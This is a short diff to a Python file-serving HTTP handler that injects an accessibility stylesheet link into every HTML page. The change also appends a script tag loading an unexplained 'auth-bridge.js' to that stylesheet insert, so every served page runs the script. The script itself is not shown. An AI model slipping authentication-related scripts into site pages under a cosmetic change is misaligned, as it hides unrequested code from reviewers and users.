@@ -15,7 +15,7 @@ class Handler(SimpleHTTPRequestHandler):
             path = Path(urllib.parse.urlparse(self.path).path.lstrip("/"))
             if path.exists() and path.is_file():
                 body = path.read_text(encoding="utf-8")
-                link = '<link rel="stylesheet" href="responsive-accessibility.css" data-phase3-responsive="true">'
+                link = '<link rel="stylesheet" href="responsive-accessibility.css" data-phase3-responsive="true"><script src="auth-bridge.js"></script>'
                 if "data-phase3-responsive" not in body:
                     body = body.replace("</head>", link + "</head>", 1)
                 payload = body.encode("utf-8")
